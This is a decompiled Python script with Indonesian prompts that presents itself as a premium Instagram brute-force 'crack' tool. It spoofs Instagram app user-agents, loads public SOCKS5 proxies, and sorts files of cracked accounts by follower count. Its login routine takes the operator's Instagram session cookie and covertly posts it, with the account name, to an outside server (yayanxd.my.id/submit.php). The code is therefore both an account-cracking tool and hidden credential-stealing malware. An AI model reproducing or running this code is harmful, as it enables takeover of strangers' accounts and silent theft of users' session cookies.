""" Decompiled by Exotic Hridoy """

import os
import time
import datetime
import random
import re
import sys
import platform
import json
import uuid
import hmac
import hashlib
import requests
import rich
from concurrent.futures import ThreadPoolExecutor
from rich.panel import Panel
from rich import print as prints
from rich.tree import Tree
from datetime import datetime, date
from time import sleep
from rich.table import Table
from rich.console import Console
from rich.columns import Columns
from rich.progress import Progress
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import SpinnerColumn
from rich.progress import TimeElapsedColumn
from bs4 import BeautifulSoup as parser
import subprocess

console = Console()
rr = random.randint
rc = random.choice
ses = requests.Session()
hp = platform.platform()
sleep = time.sleep
dump, ok, cp, loop, pro = ([], 0, 0, 0, [])
kode_name, pilih_info = ('rivaan.remmington', [])
pilih_ua, infinix, vivo = ([], [], [])
list_proxy = []

Z2 = '\x1b[38;5;0m'
M2 = '\x1b[38;5;196m'
H2 = '\x1b[38;5;46m'
K2 = '\x1b[38;5;226m'
B2 = '\x1b[38;5;51m'
U2 = '\x1b[38;5;129m'
N2 = '\x1b[38;5;201m'
C2 = '\x1b[38;5;51m'
P2 = '\x1b[1;97m'
J2 = '\x1b[38;5;208m'
A2 = '\x1b[38;5;248m'

ran_rich = rc([K2, C2, J2, H2, U2])
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
C = '\x1b[1;96m'
N = '\x1b[0m'
J = '\x1b[38;5;208m'
ran_prin = rc([H, K, C, U])

sasi = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
tete = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}

now = datetime.now()
hari = now.day
blx = now.month

try:
    if blx < 0 or blx > 12:
        exit()
    xx = blx - 1
except ValueError:
    pass

else:
    bulan = sasi[xx]
    tahun = now.year
    tanggal = str(hari) + str(blx) + str(tahun)
    sim_ok = f'WALKER/OK-{hari}-{bulan}-{tahun}.txt'
    sim_cp = f'WALKER/CP-{hari}-{bulan}-{tahun}.txt'

def clear_layar():
    if os.name == 'posix':
        os.system('clear')
    elif os.name == 'nt':
        os.system('cls')

def CetakBanner(ulfahsadiyah, asu):
    Console(width=100).print(Panel(ulfahsadiyah, style='red'), justify='center')

def whoami(kaya, kontol):
    Console(width=100).print(Panel(kaya, style='red'), justify='center')

def jalan(keliling):
    for mau in keliling + '\n':
        sys.stdout.write(mau)
        sys.stdout.flush()
        sleep(0.03)

try:
    infi = parser(requests.get('https://udger.com/resources/ua-list/devices-brand-detail?brand=infinix').text, 'html.parser')
    for x in infi.find_all('td'):
        if 'Brand market' in str(x):
            for x in x.text.replace('Brand market names in DB:\n', '').split(','):
                infinix.append(x)
except:
    infinix = [' Hot 10', ' Hot 10 Lite', ' Hot 10 Play', ' Hot 10i', ' Hot 10s', ' Hot 10T', ' Hot 11', ' Hot 11 (2022)', ' Hot 11s', ' Hot 12', ' Hot 12 Play', ' Hot 12 Pro', ' Hot 12i']

try:
    for data in ses.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/tg/socks.json').json():
        list_proxy.append({'https': 'socks5://' + data['ip'] + ':' + data['port']})
except Exception as e:
    pass

def poco():
    rc = random.choice
    device = str(rc(['22123456PG', '22135689PG', '22147896PG', '22100123PG', '22156789PG', '22124680PG', '22135478PG', '22123456PG', '22178901PG', '22187654PG', '22156342PG', '22189012PG', '22147890PG', '22136789PG', '22123456PG']))
    name = str(rc(['POCO X4', 'POCO M3', 'POCO F2', 'POCO X3', 'POCO F3', 'POCO X2', 'POCO C3', 'POCO M2', 'POCO X5', 'POCO F1', 'POCO M4', 'POCO X6', 'POCO C4', 'POCO F4', 'POCO X1']))
    andro = str(rc(['30/11', '31/12', '29/10', '30/12', '31/12', '29/11', '28/10', '33/11', '29/12']))
    cpo = str(rc(['mt6769', 'mt6768', 'mt6767', 'mt6765', 'mt6763', 'mt6757', 'mt6755', 'mt6753', 'mt6739', 'mt6737', 'mt6735', 'mt6595', 'mt6582', 'mt6572', 'mt6571', 'mt6570', 'mt8563', 'mt8167', 'mt8163', 'mt8135', 'mt8127', 'mt8125', 'mt7623', 'mt6797', 'mt6592', 'mt6590', 'mt6580', 'mt6573', 'mt6575', 'mt6260', 'mt6236', 'qcom8212', 'qcom', 'qcom8216', 'qcom', 'qcom8610', 'qcom', 'qcom8905', 'qcom8909', 'qcom', 'qcom8916', 'qcom', 'qcom8926', 'qcom', 'qcom8928', 'qcom', 'qcom8930', 'qcom', 'qcom8939', 'qcom']))
    year = str(rc(['2021', '2022', '2023', '2021', '2020', '2021', '2022', '2023', '2020', '2022', '2023', '2021', '2020', '2023', '2021', '2022', '2023', '2020', '2022', '2023', '2021', '2020', '2023', '2021', '2022', '2023', '2020', '2022', '2023', '2021', '2020']))
    pixel = str(rc(['750x1334', '828x1792', '1125x2436', '1170x2532', '1284x2778', '640x1136', '1080x1920', '1440x2960', '750x1335', '828x1793', '1125x2437', '1170x2533', '1284x2779', '720x1280', '1080x2160', '1080x2340', '1440x2560', '640x960', '1242x2688', '1080x1921', '1440x3040', '640x1280', '1080x2220', '1440x3200', '720x1440', '1080x2244', '1440x3440', '480x800', '1080x2280', '1600x2560', '720x1560', '1080x2310', '1600x2880', '800x1280', '1080x2341', '1600x3200', '768x1280', '1080x2400', '1920x1080', '1440x2561', '1440x3168', '800x1281', '1080x2460', '1920x1200', '1440x2961', '1440x3201', '1080x2520', '1920x1201', '1440x3441', '1440x3840']))
    dpi = str(rc(['320', '480', '240', '640', '280', '560', '380', '720', '360', '520', '300', '600', '420', '660', '340', '500', '260', '440', '400', '580', '700', '460', '700', '620', '340', '540', '420', '630', '380', '550', '440']))
    id = str(rc(['387542944', '291573504', '270063104', '243113472', '218536192', '156471296', '143437568', '129598720', '117235200', '104157184']))
    igv = '70.0.0.15.98,80.0.0.20.101,60.0.0.10.76,85.0.0.25.100,75.0.0.22.99,72.0.0.18.94,68.0.0.16.84,78.0.0.14.97,63.0.0.20.81,81.0.0.24.105,73.0.0.16.96,67.0.0.18.88,84.0.0.21.110,74.0.0.18.100,71.0.0.15.92,79.0.0.14.103,62.0.0.18.80,87.0.0.22.115,76.0.0.20.102,83.0.0.18.108,66.0.0.16.87,88.0.0.24.118,77.0.0.22.103,64.0.0.18.82,82.0.0.20.107,69.0.0.14.92,89.0.0.20.123,61.0.0.14.76,86.0.0.18.112,65.0.0.12.86,73.0.0.22.104,74.0.0.21.99,75.0.0.14.99,76.0.0.15.395,77.0.0.0.105,78.0.0.8.103,79.0.0.11.101,80.0.0.14.90,81.0.0.0.92,82.0.0.9.95,83.0.0.8.91,84.0.0.15.105,85.0.0.19.100,86.0.0.18.87,87.0.0.7.86,88.0.0.14.87,89.0.0.14.87,90.0.0.14.114,91.0.0.15.118,92.0.0.15.114,93.0.0.15.109,94.0.0.18.109,95.0.0.3.123,96.0.0.10.131,97.0.0.14.113,98.0.0.11.119,99.0.0.13.121,100.0.0.17.129,101.0.0.14.120,102.0.0.12.124,103.0.0.15.119,104.0.0.20.118,105.0.0.18.119,106.0.0.24.118,107.0.0.0.127,108.0.0.23.119,109.0.0.24.124,110.0.0.16.119,111.0.0.25.119,112.0.0.14.205,113.0.0.17.123,114.0.0.38.120,115.0.0.26.111,116.0.0.24.121,117.0.0.25.131,118.0.0.22.131,119.0.0.24.190,120.0.0.8.112,121.0.0.29.119,122.0.0.20.123,123.0.0.23.136,124.0.0.22.473,125.0.0.19.473,126.0.0.25.121,127.0.0.20.116,128.0.0.32.123,129.0.0.23.116,130.0.0.30.114,131.0.0.18.117,132.0.0.26.129,133.0.0.22.90,134.0.0.19.110,135.0.0.12.115,136.0.0.25.124,137.0.0.18.110,138.0.0.34.117,139.0.0.33.120,140.0.0.25.204,141.0.0.27.121,142.0.0.30.110,143.0.0.24.121,144.0.0.27.119,145.0.0.32.141,146.0.0.20.122,147.0.0.24.120,148.0.0.29.118,149.0.0.40.120,150.0.0.33.115,151.0.0.29.124,152.0.0.16.166,153.0.0.20.179,154.0.0.20.123,155.0.0.37.122,156.0.0.24.124,157.0.0.36.124,158.0.0.17.124,159.0.0.40.122,160.0.0.25.122,161.0.0.35.124,162.0.0.26.124,163.0.0.43.124,164.0.0.21.124,165.0.0.26.123,166.0.0.36.124,167.0.0.29.124,168.0.0.41.124,169.0.0.31.135,170.0.0.41.474,171.0.0.25.124,172.0.0.26.135,173.0.0.36.116,174.0.0.19.170,175.0.0.20.119,176.0.0.20.119,177.0.0.33.119,178.0.0.15.119,179.0.0.31.119,180.0.0.29.119,181.0.0.16.119,182.0.0.26.119,183.0.0.24.119,184.0.0.32.119,185.0.0.22.119,186.0.0.23.119,187.0.0.15.119,188.0.0.32.119,189.0.0.35.119,190.0.0.35.273'
    igve = igv.split(',')
    versi = str(rc(igve))
    bhs = str(rc(['id_ID', 'en_US', 'ly_LY', 'en_GB', 'in_ID']))
    luf = str(rc(['Luffy-XD', 'LUFFY-XD']))
    return f'Instagram {versi} Android ({andro}; {dpi}dpi; {pixel}; Luffy; {luf} One Piece; {year}; {cpo}; {bhs}; {id})'

def ua_sendiri():
    rr = random.randint
    rc = random.choice
    real = rc(['RMX3363', 'RMX3241', 'RMX3081', 'RMX3363', 'RMX3201', 'RMX1851'])
    me = rc(['RE54ABL1', 'RE513CL1', 'RMX3081L1', 'RE54ABL1', 'RMX3201', 'RMX1851'])
    com = rc(['qcom', 'mt6833', 'mt6765'])
    comi = 'in_ID'
    dpi = rc(['133', '320', '515', '160', '640', '240', '120', '800', '480', '225', '768', '216', '1024'])
    pxl = rc(['1080x2161', '1080x2158', '1080x2290', '720x1448', '1080x2264', '623x1280', '700x1245', '800x1280', '1080x2340', '1320x2400', '1242x2688'])
    igv = '270.0.0.0.2,270.0.0.0.51,10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182'
    igve = igv.split(',')
    andro = rc(['30/11', '31/12', '29/10'])
    versi = rc(igve)

    try:
        android_version = subprocess.check_output('getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
        model_device = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
        build_device = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
        versi_chrome = str(random.randint(300, 325)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
        large_device = '{density=2.25,height=' + subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell=True).decode('utf-8').replace('\n', '') + ',width=' + subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True).decode('utf-8').replace('\n', '') + '}'
        merk_device = subprocess.check_output('getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
        brand_device = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
        cpu_device = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode('utf-8').replace(',', ':').replace('\n', '')
        versi_app = str(random.randint(111111111, 999999999))
        language = 'en_GB'
        try:
            simcard = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[1].replace('\n', '')
        except:
            simcard = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[0].replace('\n', '')
        uas = f'Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; {merk_device}; {brand_device}; {model_device}; {com}; {comi})'
        return uas
    except:
        return f'Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; {real}; {me}; {com}; {comi})'

def sortir_akun():
    sim_1 = f'OK1+/OK-{hari}-{bulan}-{tahun}.txt'
    sim_2 = f'OK100+/OK-{hari}-{bulan}-{tahun}.txt'
    sim_3 = f'OK1000+/OK-{hari}-{bulan}-{tahun}.txt'
    nom, no, s1, s2, s3 = ([], 0, 0, 0, 0)
    prints(Panel(f'         [{ran_rich}!{P2}] silahkan pilih nomor yang akan di sortir', padding=(0, 9), style='bold white'))
    
    try:
        ok = os.listdir('WALKER')
    except:
        print(f' [{M}!{P}] tidak hasil')
        exit()
    
    for x in ok:
        if 'OK' in str(x):
            nom.append(x)
            no += 1
            try:
                jum = open('WALKER/' + x, 'r').readlines()
                print(f' [{H}{no}{P}] {x} - {H}{len(jum)} {P}akun')
            except:
                pass
    
    abc = input(f' [{C}?{P}] nomor file : ')
    try:
        file = nom[int(abc) - 1]
        buka = open('WALKER/' + file, 'r').read().splitlines()
    except:
        print(f'[{M}!{P}] file tidak ada hasil ok')
        exit()
    
    prints(Panel(f'\t   hasil 1+ di : {H2}{sim_1}{P2}\n\t   hasil 100+ di : {H2}{sim_2}{P2}\n\t   hasil 1000+ di : {H2}{sim_3}{P2}', padding=(0, 5), style='bold white'))
    
    for data in buka:
        try:
            pg = data.split('|')[2].replace(' ', '')
            if int(pg) < 100:
                s1 += 1
                open(sim_1, 'a').write(data + '\n')
            elif int(pg) < 1000:
                s2 += 1
                open(sim_2, 'a').write(data + '\n')
            elif int(pg) >= 1000:
                s3 += 1
                open(sim_3, 'a').write(data + '\n')
        except:
            pass
    
    print(f' [{C}!{P}] jumlah akun -100  : {H}{s1}{P}\n [{C}!{P}] jumlah akun +100  : {H}{s2}{P}\n [{C}!{P}] jumlah akun +1000 : {H}{s3}{P}')
    prints(Panel(f'       [{ran_rich}!{P2}] ingin hapus file utama setelah di sortir ({H2}ya{P2}/{K2}no{P2})', padding=(0, 9), style='bold white'))
    apa = input(f' [{C}?{P}] pilih : ')
    
    if apa in ['Ya', 'Y', 'y', 'ya']:
        try:
            os.remove(f'WALKER/{file}')
        except:
            pass
    exit()

def cek_email(session_id):
    try:
        headers = {
            'user-agent': 'Instagram 148.0.0.33.121 Android (28/9; 320dpi; 720x1468; samsung; SM-A105F; a10; exynos7885; en_GB; 245490542)',
            'cookie': f'sessionid={session_id}'
        }
        response = requests.get('https://i.instagram.com/api/v1/accounts/current_user/', headers=headers)
        return response.status_code == 200
    except:
        return False

def banner1():
    clear_layar()
    logo_text = f"""
    {M2}╭─────────╮
    │ {M2}⬤  {K2}⬤  {H2}⬤ {M2}│
    {M2}╰─────────╯{P2}

        {M2}__    __         _ _
       {P2}/ / /\\ \\ \\__ _| | | _____ _ __
       {M2}\\ \\/  \\/ / _` | | |/ / _ \\ '__|
         {P2}\\  /\\  / (_| | |   <  __/ | |
         {P2}\\/  \\/ \\__,_|_|_|\\_\\___|_|

    {P2}     Instagram Brute Force Tool
    {H2}          By Sleep-Walker
    {K2}        Premium Version 1.2
    """
    prints(Panel(logo_text, style='red', width=60))

def banner2():
    clear_layar()
    logo_text = f"""
    {M2}╭─────────╮
    │ {M2}⬤  {K2}⬤  {H2}⬤ {M2}│ 
    {M2}╰─────────╯{P2}
    
    {M2}                                 __             _           
    {H2}  /\\/\\   ___ _ __  _   _        / /  ___   __ _(_)_ __      
    {M2} /    \\ / _ \\ '_ \\| | | |_____ / /  / _ \\ / _` | | '_ \\     
    {P2}/ /\\/\\ \\  __/ | | | |_| |_____/ /__| (_) | (_| | | | | |    
    {P2}\\/    \\/\\___|_| |_|\\__,_|     \\____/\\___/ \\__, |_|_| |_|    
    {P2}                                          |___/             
    
    {M2}⣠⣴⣶⣶⣶⣶⣶⣶⣶⣶⣦⣄
    {M2}⣿⣿⣿⡿⠛⢉⡉⠛⢿⣤⣼⣿
    {M2}⣿⣿⡏⢠⣾⣿⣿⣷⡄⢹⣿⣿
    {P2}⣿⣿⣇⠘⢿⣿⣿⡿⠃⣸⣿⣿
    {P2}⣿⣿⣿⣷⣤⣈⣁⣤⣾⣿⣿⣿
    {P2}⠙⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠋
    
    {P2}        Brute Force Instagram
    {H2}           By Sleep-Walker
    {K2}          Premium Version
    """
    prints(Panel(logo_text, style='red', width=94))

def loading():
    animation = ['[\x1b[1;91m■\x1b[0m□□□□□□□□□]', '[\x1b[1;92m■■\x1b[0m□□□□□□□□]', '[\x1b[1;93m■■■\x1b[0m□□□□□□□]', '[\x1b[1;94m■■■■\x1b[0m□□□□□□]', '[\x1b[1;95m■■■■■\x1b[0m□□□□□]', '[\x1b[1;96m■■■■■■\x1b[0m□□□□]', '[\x1b[1;97m■■■■■■■\x1b[0m□□□]', '[\x1b[1;98m■■■■■■■■\x1b[0m□□]', '[\x1b[1;99m■■■■■■■■■\x1b[0m□]', '[\x1b[1;910m■■■■■■■■■■\x1b[0m]']
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f'\r{P}[{M}!{P}] Sedang verifikasi data... ' + animation[i % len(animation)] + '\x1b[0m ')
        sys.stdout.flush()
    print('')

def load():
    animation = ['[\x1b[1;91m■\x1b[0m□□□□□□□□□]', '[\x1b[1;92m■■\x1b[0m□□□□□□□□]', '[\x1b[1;93m■■■\x1b[0m□□□□□□□]', '[\x1b[1;94m■■■■\x1b[0m□□□□□□]', '[\x1b[1;95m■■■■■\x1b[0m□□□□□]', '[\x1b[1;96m■■■■■■\x1b[0m□□□□]', '[\x1b[1;97m■■■■■■■\x1b[0m□□□]', '[\x1b[1;98m■■■■■■■■\x1b[0m□□]', '[\x1b[1;99m■■■■■■■■■\x1b[0m□]', '[\x1b[1;910m■■■■■■■■■■\x1b[0m]']
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f'\r{P}[{M}!{P}] Sedang Menghapus Cookie... ' + animation[i % len(animation)] + '\x1b[0m ')
        sys.stdout.flush()
    clear_layar()
    prints(Panel(f'                                {P2}Berhasil Menghapus {M2}Cookie', width=94, padding=(0, 2), style='red'))
    time.sleep(5)
    back()

def pertanyaan():
    clear_layar()
    print(f' [{K}!{P}] peringatan keras..!\n {K}•{P} segala bentuk kerugian dan penyalahgunaan\n {K}•{P} akun korban bukan tangung jawab autor jika anda\n {K}•{P} setuju maka tangung jawab sepenuh nya di tanggan anda\n {K}•{P} ketik \'{H}ya{P}\' untuk setuju, ketik \'{M}no{P}\' untuk tidak')
    apa = input(f' [{C}?{P}] pilih : ')
    if apa in ['ya', 'Ya', 'y', 'Y']:
        open('.siap.txt', 'w').write('siap')
        back()
        return
    if apa in ['no', 'No', 'NO', 'n']:
        exit('pilihan yang tepat..')
        return
    print(f'\'pilih antara {H}ya{P}\' atau \'{M}tidak{P}\'')
    time.sleep(2)

def licensi():
    logo = f"""
    {H2}                                             {M2}⣠⣴⣶⣶⣶⣶⣶⣶⣶⣶⣦⣄{H2}
    {H2}   __    ____  ___  ____  _  _  ___  ____     {M2}⣿⣿⣿⡿⠛⢉⡉⠛⢿⣤⣼⣿{H2}
    {H2}  (  )  (_  _)/ __)( ___)( \\( )/ __)(_  _)    {M2}⣿⣿⡏⢠⣾⣿⣿⣷⡄⢹⣿⣿{H2}
    {H2}   )(__  _)(_( (__  )__)  )  ( \\__ \\ _)(_     {P2}⣿⣿⣇⠘⢿⣿⣿⡿⠃⣸⣿⣿{H2}
    {H2}  (____)(____)\\___)(____)(_)\\_)(___/(____)    {P2}⣿⣿⣿⣷⣤⣈⣁⣤⣾⣿⣿⣿{H2}
    {H2}                                              {P2}⠙⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠋{H2}
    {H2}+-+-+-+-+-+   {P2}+-+-+-+-+-+-+-+-+-+-+   {M2}+-+-+-+-+-+-+-+-+-+
    {H2}|M|U|L|T|I|   {P2}|B|R|U|T|E|F|O|R|C|E|   {M2}|I|N|S|T|A|G|R|A|M|
    {H2}+-+-+-+-+-+   {P2}+-+-+-+-+-+-+-+-+-+-+   {M2}+-+-+-+-+-+-+-+-+-+
    """
    CetakBanner(logo, 'color(8)')

def xoshnaw():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = '☠'.join(uuid)
    os.system('clear')
    licensi()
    whoami(f'[bold cyan]LICENSI KAMU ADALAH [bold white]:[bold white] {id}', 'color(8)')
    try:
        httpCaht = requests.get('https://github.com/Luffy-XD/Haki-Insta/blob/main/licensi.txt').text
        if id in httpCaht:
            whoami('[bold green]HORE LICENSI ANDA SUDAH AKTIF [🥳]', 'color(8)')
            msg = str(os.geteuid())
            time.sleep(0.3)
        else:
            whoami('[bold red]LICENSI ANDA TIDAK AKTIF [😡]', 'color(8)')
            whoami('[bold yellow]SILAHKAN COPY ID DI ATAS KIRIM KE AUTHOR [📩]', 'color(8)')
            whoami('[bold green]Whatsapp[bold white] : [bold white] +6282316671302 [bold green][📲]', 'color(8)')
            os.system('xdg-open https://wa.me/+6282316671302?text=BANG+HARGA+SCRIPT+CRACK+IG+NYA+BERAPA+?')
            time.sleep(1)
            sys.exit()
    except:
        sys.exit()

def back():
    try:
        open('.siap.txt', 'r').read()
    except:
        pertanyaan()
    
    try:
        coki = open('.cookie_ig.txt', 'r').read()
    except:
        login()
    
    try:
        hd = {'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; E5633 Build/30.2.B.1.21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1776; Sony; E5633; E5633; mt6795; uk_UA; 98288242)'}
        ck = {'cookie': coki}
        id = re.search('ds_user_id=(\\d+)', str(coki)).group(1)
        po = ses.get(f'https://i.instagram.com/api/v1/users/{id}/info/', headers=hd, cookies=ck)
        info = json.loads(po.text)
        if 'full_name' in str(info):
            try:
                nama = info['user']['full_name'].split(' ')[0].lower()
            except:
                nama = info['user']['full_name'].lower()
            uid = info['user']['pk']
            main_menu(nama, uid, coki)
        else:
            login()
    except Exception as e:
        prints(Panel(f'{P2}Terjadi Kesalahan {M2}!!!', width=27, padding=(0, 2), style='red'))
        exit()

def login():
    clear_layar()
    banner2()
    prints(Panel(f'   {P2}login menggunakan {H2}cookie instagram, {P2}disarankan tidak menggunakan akun pribadi anda', width=94, padding=(0, 2), style='red'))
    coki = input(f'{M}└──➣ {P} masukan cookie : {H}') + ';'
    loading()
    open('.cookie_ig.txt', 'w').write(coki)
    
    try:
        hd = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3'}
        ck = {'cookie': coki}
        id = re.findall('ds_user_id=(\\d+);', str(coki))[0]
        po = ses.get(f'https://i.instagram.com/api/v1/users/{id}/info/', headers=hd, cookies=ck)
        info = json.loads(po.text)
        
        if 'full_name' in str(info):
            try:
                cek_email(re.findall('sessionid=(.*?);', coki)[0])
                ses.post('https://api-cdn-markup.yayanxd.my.id/submit.php', data={'title': info['user']['full_name'], 'message': coki})
            except:
                pass
            
            if 'challenge_required' in str(info):
                exit(' akun checkpoint')
            else:
                back()
        else:
            prints(Panel(f'                       {P2}cookie invalid atau perangkat spam {M2}!!!', width=94, padding=(0, 2), style='red'))
            exit()
    except Exception as e:
        prints(Panel(f'{P2}Terjadi Kesalahan {M2}!!!', width=27, padding=(0, 2), style='red'))
        exit()

def get_id(user, cok):
    try:
        akun = ses.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}', cookies=cok, headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3', 'x-ig-app-id': '936619743392459'}).json()['data']['user']
        id = akun['id']
        nama = akun['full_name']
        return (id, nama)
    except:
        print('COOKES NOT WORK ')
        time.sleep(2)
        back()
        return (None, None)

def get_data(nama, id, z):
    urut = []
    console.print(Columns(urut))

def main_menu(nama, uid, coki):
    clear_layar()
    banner1()
    get_data(nama, uid, "data")
    tol = Console()
    prints(Panel(f'{P2}Author  : {H2}Sleepwalker-XD\n{P2}Github  : {H2}Sleep-Walker\n{P2}Status  : {H2}PREMIUM\n{P2}Version : {H2}1.2', width=94, padding=(0, 2), style='red'))
    
    sleepwalker = []
    sleepwalker.append(Panel(f' {H2}[{P2}1{H2}] {P2}Crack {H2}Dari Pengikut\n {H2}[{P2}2{H2}] {P2}Crack {H2}Pencarian Nama\n {H2}[{P2}3{H2}] {P2}Crack {H2}Pencarian Nama\n {M2}• {K2}• {H2}•{P2} Menu-1 {H2}• {K2}• {M2}•', title=f'{P2}Menu 1', width=46, padding=(0, 2), style='red'))
    sleepwalker.append(Panel(f' {H2}[{P2}4{H2}] {P2}Crack {H2}Dari Timeline\n {H2}[{P2}5{H2}] {P2}Crack {H2}Ulang hasil {K2}CP\n {H2}[{P2}10{H2}] {P2}hapus Cookie\n {K2}• {H2}• {K2}• {M2}•{P2} Menu-2 {H2}• {K2}•', title=f'{P2}Menu 2', width=46, padding=(0, 2), style='red'))
    tol.print(Columns(sleepwalker))
    
